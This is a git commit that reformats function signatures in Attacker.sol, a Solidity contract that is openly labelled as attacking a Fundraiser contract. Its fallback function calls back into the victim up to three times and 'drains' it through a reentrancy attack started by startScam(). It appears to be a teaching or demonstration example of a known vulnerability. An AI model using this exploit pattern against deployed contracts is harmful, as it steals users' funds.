5e621bea4baf5347f2115da588c5a51aedb64b32
TobyKreiselmaier <the.rainmaker@mail.com>
2020-12-22 10:58:53 -0500

    Cleaned up code

--- Attacker.sol
+++ Attacker.sol
@@ -15,13 +15,15 @@ contract Attacker{
     /* Public functions */
     /// @dev Captures address of the victim contract.
     /// @param victimAddress address of victim contract on blockchain.
-    function Attacker(address victimAddress) public 
+    function Attacker(address victimAddress)
+        public 
     {
         fundraiserAddress = victimAddress;
     }
 
     /// @dev Fallback function draining the victim contract.
-    function() external payable
+    function()
+        external payable
     {
         if(drainTimes<3){
             drainTimes++;
@@ -30,19 +32,22 @@ contract Attacker{
     }
     
     /// @dev Getter function for balance of attacker contract.
-    function getFunds() public returns (uint)
+    function getFunds()
+        public returns (uint)
     {
         return address(this).balance;
     }
 
     /// @dev Calling the victim's contract contribute() method for funding.
-    function payMe() public payable
+    function payMe()
+        public payable
     {
         Fundraiser(fundraiserAddress).contribute.value(msg.value)();
     }
 
     /// @dev Calling the victim's contract withdraw() method to start the scam.
-    function startScam() public
+    function startScam()
+        public
     {
         Fundraiser(fundraiserAddress).withdraw();
     }
